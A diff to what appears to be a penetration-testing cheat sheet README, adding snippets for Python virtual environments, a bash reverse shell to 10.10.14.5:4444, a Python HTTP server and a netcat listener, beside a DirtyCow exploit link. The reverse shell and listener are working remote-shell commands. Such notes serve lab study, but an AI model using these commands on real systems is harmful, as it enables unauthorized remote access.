@@ -17,7 +17,32 @@
   - [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
 - Kindle Books
  
-# CODE SNIPPETS
+# COMMON CODE SNIPPETS
+### Python Virtual Environment
+```
+# Create the virtual environment
+python3 -m venv v-env
+
+# Start virtual environment
+source v-env/bin/activate
+
+# Stop virtual environment
+deactivate
+```
+### Bash Reverse Shell
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+```
+### Python HTTP Server
+```
+# Serves files from current directory, also accessible vias browser
+python3 -m http.server 8000
+```
+### Netcat Listener
+```
+nc -lvnp 4444
+```
 
 # WINDOWS BASICS
 ### Windows Administrative Binaries
